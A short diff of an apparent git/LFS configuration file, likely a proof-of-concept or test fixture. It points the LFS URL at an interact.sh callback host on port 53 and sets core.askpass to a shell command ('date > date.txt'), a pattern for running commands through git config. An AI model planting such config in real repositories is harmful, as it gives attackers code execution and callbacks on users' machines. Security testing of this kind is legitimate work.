@@ -1,5 +1,5 @@
 [lfs]
-	url = imaps://caspzwq2vtc0000wpc9ggfc5x6cyyyyyb.interact.sh
+	url = http://caspzwq2vtc0000wpc9ggfc5x6cyyyyyb.interact.sh:53
 	storage = ../lfstorage
 [core]
 	askpass = date > date.txt
